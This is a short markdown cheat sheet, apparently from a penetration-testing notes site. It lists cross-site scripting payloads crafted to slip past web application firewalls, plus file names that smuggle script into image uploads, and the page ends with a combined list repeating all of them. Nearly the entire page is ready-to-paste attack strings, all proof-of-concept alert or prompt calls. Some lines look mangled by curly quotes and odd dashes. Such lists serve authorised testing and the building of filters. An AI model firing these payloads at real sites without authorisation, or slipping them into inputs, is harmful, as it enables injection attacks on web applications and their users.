---
description: Cross-Site Scripting Vulnerabilities
---

# XSS

#### WAF Bypass

```
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
<svg onx=() onload=(confirm)(1)>
<a+HREF=‘javascrip%26%239t:alert%26lpar;document.domain)’>test</a>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<—`<img/src=` onerror=confirm``> —!>
Javascript:{alert`0`}
<svg onload=prompt%26%230000000040document.domain)>
```

#### [File Upload](https://twitter.com/Steiner254/status/1564118488175755267)

If you find a file upload function for an image, try introducing an image with XSS in the filename like so:

```
<img src=x onerror=alert('XSS')>.png 
"><img src=x onerror=alert('XSS')>.png 
">.svg <alert('xss')a.png
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
```

### Collection (all payloads)

```
<img src=x onerror=alert('XSS')>.png 
"><img src=x onerror=alert('XSS')>.png 
">.svg <alert('xss')a.png
<svg onx=() onload=(confirm)(1)>
<a+HREF=‘javascrip%26%239t:alert%26lpar;document.domain)’>test</a>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<—`<img/src=` onerror=confirm``> —!>
Javascript:{alert`0`}
<svg onload=prompt%26%230000000040document.domain)>
```


